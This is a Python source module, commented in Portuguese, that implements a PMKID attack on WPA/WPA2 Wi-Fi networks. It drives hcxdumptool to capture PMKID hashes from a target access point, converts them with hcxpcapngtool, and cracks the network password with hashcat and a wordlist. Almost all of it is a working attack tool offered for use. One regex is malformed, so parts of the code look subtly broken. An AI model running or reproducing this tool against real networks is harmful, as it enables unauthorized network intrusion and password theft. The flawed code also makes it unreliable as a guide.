"""
Módulo de ataque PMKID.

Este módulo implementa ataques contra redes WPA/WPA2 usando a vulnerabilidade PMKID,
que permite capturar hashes PMKID sem a necessidade de um handshake completo.
"""
import os
import re
import time
import logging
import subprocess
import tempfile
from typing import Optional, Dict, List, Tuple, Any, Callable
from dataclasses import dataclass, field
from enum import Enum, auto

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn

from ...core.models.network import WiFiNetwork
from ...core.utils import (
    is_root, check_dependencies, get_network_interfaces,
    set_monitor_mode, restore_network_interface, command_exists
)

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
console = Console()

class PMKIDEventType(Enum):
    """Tipos de eventos do ataque PMKID."""
    START = auto()
    PMKID_CAPTURED = auto()
    CRACK_SUCCESS = auto()
    CRACK_FAILED = auto()
    ERROR = auto()
    PROGRESS = auto()
    COMPLETE = auto()

@dataclass
class PMKIDEvent:
    """Evento de progresso do ataque PMKID."""
    type: PMKIDEventType
    message: str = ""
    data: Dict[str, Any] = field(default_factory=dict)

class PMKIDAttack:
    """Classe para realizar ataques PMKID em redes WPA/WPA2."""
    
    def __init__(self, interface: str = None, timeout: int = 300):
        """
        Inicializa o ataque PMKID.
        
        Args:
            interface: Interface de rede para usar no ataque
            timeout: Tempo máximo de execução em segundos
        """
        self.interface = interface
        self.timeout = timeout
        self.is_running = False
        self.stop_requested = False
        self.pmkid_captured = False
        self.pmkid_file = ""
        self.psk = ""
        
        # Verifica dependências
        self._check_dependencies()
        
        # Verifica privilégios
        if not is_root():
            raise PermissionError("Este ataque requer privilégios de root")
    
    def _check_dependencies(self) -> None:
        """Verifica se todas as dependências necessárias estão instaladas."""
        required = ['hcxdumptool', 'hcxpcapngtool', 'hashcat']
        missing = [cmd for cmd in required if not command_exists(cmd)]
        
        if missing:
            raise RuntimeError(
                f"As seguintes dependências estão faltando: {', '.join(missing)}\n"
                "Instale-as com: sudo apt install hcxtools hashcat"
            )
    
    def capture_pmkid(self, bssid: str, channel: int, 
                     output_prefix: str = "pmkid",
                     callback: Callable[[PMKIDEvent], None] = None) -> Tuple[bool, str]:
        """
        Captura um hash PMKID de uma rede.
        
        Args:
            bssid: Endereço MAC do ponto de acesso
            channel: Canal da rede
            output_prefix: Prefixo para os arquivos de saída
            callback: Função de callback para eventos
            
        Returns:
            Tupla (sucesso, caminho_do_arquivo_capturado)
        """
        self.is_running = True
        self.stop_requested = False
        self.pmkid_captured = False
        self.pmkid_file = ""
        
        # Configura o monitoramento de eventos
        def event_handler(event_type: PMKIDEventType, message: str = "", **kwargs):
            if callback:
                event = PMKIDEvent(type=event_type, message=message, data=kwargs)
                callback(event)
        
        # Cria um diretório temporário para os arquivos
        with tempfile.TemporaryDirectory() as temp_dir:
            try:
                output_file = os.path.join(temp_dir, output_prefix)
                pcapng_file = f"{output_file}.pcapng"
                hc22000_file = f"{output_file}.hc22000"
                
                # Comando para capturar PMKID com hcxdumptool
                cmd_hcxdumptool = [
                    'hcxdumptool',
                    '-i', self.interface,
                    '--enable_status=1',
                    '-o', pcapng_file,
                    '--filterlist=/dev/null',
                    '--filtermode=2',
                    '--disable_client_attacks',
                    '--enable_status=1'
                ]
                
                # Se um BSSID específico for fornecido, filtra por ele
                if bssid:
                    cmd_hcxdumptool.extend(['--bssid', bssid])
                
                # Se um canal específico for fornecido, fixa nele
                if channel:
                    cmd_hcxdumptool.extend(['--channel', str(channel)])
                
                event_handler(PMKIDEventType.START, "Iniciando captura do PMKID...")
                
                # Executa o hcxdumptool em segundo plano
                hcxdump_proc = subprocess.Popen(
                    cmd_hcxdumptool,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True
                )
                
                # Monitora a saída do hcxdumptool
                start_time = time.time()
                pmkid_found = False
                
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(bar_width=40),
                    "[progress.percentage]{task.percentage:>3.0f}%",
                    TimeElapsedColumn(),
                    console=console,
                    transient=True,
                ) as progress:
                    task = progress.add_task("Aguardando PMKID...", total=100)
                    
                    while True:
                        # Verifica timeout
                        if time.time() - start_time > self.timeout:
                            event_handler(
                                PMKIDEventType.ERROR,
                                "Tempo limite excedido na captura do PMKID"
                            )
                            hcxdump_proc.terminate()
                            return False, ""
                        
                        # Verifica se foi solicitado para parar
                        if self.stop_requested:
                            event_handler(
                                PMKIDEventType.ERROR,
                                "Captura interrompida pelo usuário"
                            )
                            hcxdump_proc.terminate()
                            return False, ""
                        
                        # Lê a saída do processo
                        line = hcxdump_proc.stdout.readline()
                        if not line and hcxdump_proc.poll() is not None:
                            break
                        
                        if line:
                            # Verifica se encontrou um PMKID
                            if "PMKID" in line or "EAPOL" in line:
                                pmkid_found = True
                                event_handler(
                                    PMKIDEventType.PMKID_CAPTURED,
                                    "PMKID capturado com sucesso!",
                                    details=line.strip()
                                )
                                hcxdump_proc.terminate()
                                break
                            
                            # Envia atualizações de status
                            event_handler(PMKIDEventType.PROGRESS, line.strip())
                        
                        # Atualiza a barra de progresso
                        elapsed = time.time() - start_time
                        progress.update(task, completed=min(100, (elapsed / self.timeout) * 100))
                        
                        # Aguarda um pouco antes da próxima verificação
                        time.sleep(0.5)
                
                # Se encontrou um PMKID, converte para o formato hc22000
                if pmkid_found and os.path.exists(pcapng_file):
                    event_handler(PMKIDEventType.PROGRESS, "Convertendo captura para formato hc22000...")
                    
                    # Comando para converter o arquivo pcapng para hc22000
                    cmd_convert = [
                        'hcxpcapngtool',
                        '-o', hc22000_file,
                        pcapng_file
                    ]
                    
                    try:
                        subprocess.run(cmd_convert, check=True, capture_output=True, text=True)
                        
                        if os.path.exists(hc22000_file) and os.path.getsize(hc22000_file) > 0:
                            self.pmkid_captured = True
                            self.pmkid_file = hc22000_file
                            
                            # Copia o arquivo para o diretório atual
                            import shutil
                            final_file = os.path.join(os.getcwd(), f"{output_prefix}.hc22000")
                            shutil.copy2(hc22000_file, final_file)
                            
                            event_handler(
                                PMKIDEventType.COMPLETE,
                                f"Arquivo PMKID salvo como: {final_file}",
                                pmkid_file=final_file
                            )
                            
                            return True, final_file
                        else:
                            event_handler(
                                PMKIDEventType.ERROR,
                                "Falha ao converter o arquivo de captura"
                            )
                            
                    except subprocess.CalledProcessError as e:
                        event_handler(
                            PMKIDEventType.ERROR,
                            f"Erro ao converter o arquivo de captura: {e.stderr}"
                        )
                
                return False, ""
                
            except Exception as e:
                event_handler(
                    PMKIDEventType.ERROR,
                    f"Erro durante a captura do PMKID: {str(e)}"
                )
                return False, ""
            
            finally:
                self.is_running = False
                # Encerra processos em execução
                try:
                    hcxdump_proc.terminate()
                except:
                    pass
    
    def crack_pmkid(self, hc22000_file: str, wordlist: str, 
                   bssid: str = "", essid: str = "",
                   callback: Callable[[PMKIDEvent], None] = None) -> Tuple[bool, str]:
        """
        Tenta quebrar um hash PMKID usando o hashcat.
        
        Args:
            hc22000_file: Caminho para o arquivo .hc22000
            wordlist: Caminho para o arquivo de wordlist
            bssid: Endereço MAC do ponto de acesso (opcional)
            essid: Nome da rede (opcional)
            callback: Função de callback para eventos
            
        Returns:
            Tupla (sucesso, senha)
        """
        if not os.path.exists(hc22000_file):
            if callback:
                event = PMKIDEvent(
                    type=PMKIDEventType.ERROR,
                    message=f"Arquivo .hc22000 não encontrado: {hc22000_file}",
                    data={'hc22000_file': hc22000_file}
                )
                callback(event)
            return False, ""
        
        if not os.path.exists(wordlist):
            if callback:
                event = PMKIDEvent(
                    type=PMKIDEventType.ERROR,
                    message=f"Arquivo de wordlist não encontrado: {wordlist}",
                    data={'wordlist': wordlist}
                )
                callback(event)
            return False, ""
        
        self.is_running = True
        self.stop_requested = False
        self.psk = ""
        
        # Configura o monitoramento de eventos
        def event_handler(event_type: PMKIDEventType, message: str = "", **kwargs):
            if callback:
                event = PMKIDEvent(type=event_type, message=message, data=kwargs)
                callback(event)
        
        try:
            # Comando para quebrar o hash PMKID com hashcat
            cmd = [
                'hashcat',
                '-m', '22000',  # Modo WPA-PBKDF2-PMKID+EAPOL
                '--quiet',
                '--status',
                '--status-timer=5',
                '--potfile-disable',  # Não salvar no arquivo pot
                '--force',
                hc22000_file,
                wordlist
            ]
            
            event_handler(PMKIDEventType.START, "Iniciando quebra do hash PMKID com hashcat...")
            
            # Executa o hashcat
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            # Monitora a saída
            key_found = False
            key_pattern = re.compile(r'^([a-fA-F0-9]{32}):([^:]+)$')
            status_pattern = re.compile(r'Speed\s*\(\d+)\)\s*([\d.]+)\s*(\w+\/s)')
            
            while True:
                # Verifica se foi solicitado para parar
                if self.stop_requested:
                    process.terminate()
                    event_handler(
                        PMKIDEventType.ERROR,
                        "Quebra de hash interrompida pelo usuário"
                    )
                    return False, ""
                
                # Lê a saída
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                if line:
                    # Remove espaços em branco
                    line = line.strip()
                    
                    # Verifica se encontrou a senha
                    if line.startswith('STATUS'):
                        parts = line.split()
                        if len(parts) >= 3 and parts[1] == 'CRACKED':
                            # Formato: STATUS 5 CRACKED hash:senha
                            hash_psk = ':'.join(parts[2:])
                            key_match = key_pattern.match(hash_psk)
                            if key_match:
                                self.psk = key_match.group(2)
                                key_found = True
                                event_handler(
                                    PMKIDEventType.CRACK_SUCCESS,
                                    f"Senha encontrada: {self.psk}",
                                    psk=self.psk
                                )
                                process.terminate()
                                return True, self.psk
                    
                    # Verifica o progresso
                    elif 'Speed' in line and 'Recovered' in line:
                        # Extrai a velocidade de tentativas
                        speed_match = status_pattern.search(line)
                        if speed_match:
                            speed = float(speed_match.group(2))
                            unit = speed_match.group(3)
                            
                            # Converte a velocidade para tentativas/segundo
                            if unit == 'kH/s':
                                speed *= 1000
                            elif unit == 'MH/s':
                                speed *= 1000000
                            
                            event_handler(
                                PMKIDEventType.PROGRESS,
                                f"Velocidade: {speed:,.0f} tentativas/segundo",
                                speed=speed
                            )
                
                # Aguarda um pouco antes da próxima verificação
                time.sleep(0.1)
            
            # Verifica se o processo terminou com sucesso
            if process.poll() == 0 and not key_found:
                event_handler(
                    PMKIDEventType.CRACK_FAILED,
                    "Senha não encontrada na wordlist fornecida"
                )
            
            return key_found, self.psk if key_found else ""
            
        except Exception as e:
            event_handler(
                PMKIDEventType.ERROR,
                f"Erro durante a quebra do hash PMKID: {str(e)}"
            )
            return False, ""
            
        finally:
            self.is_running = False
    
    def stop(self):
        """Solicita a interrupção do ataque."""
        self.stop_requested = True
